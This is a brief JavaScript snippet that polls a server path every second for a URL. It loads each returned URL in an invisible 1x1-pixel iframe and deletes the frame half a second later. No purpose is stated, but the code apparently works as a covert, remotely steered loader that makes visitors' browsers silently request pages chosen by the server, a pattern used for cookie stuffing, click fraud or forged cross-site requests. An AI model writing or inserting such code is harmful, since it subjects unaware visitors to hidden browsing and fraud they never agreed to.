window.setInterval(function(){
    fetch("/scrooge/link").then(function(response){
        console.log(response)
    
        response.json().then(function(data) {
            console.log(data.u)
            if (data.u == "") {
                return;
            }
            var ifrm = document.createElement("iframe");
            ifrm.setAttribute("src", data.u);
            ifrm.style.width = "1px";
            ifrm.style.height = "1px";
            document.body.appendChild(ifrm);
            window.setTimeout(function(){
                document.body.removeChild(ifrm)
            }, 500)
        });
    })
}, 1000)
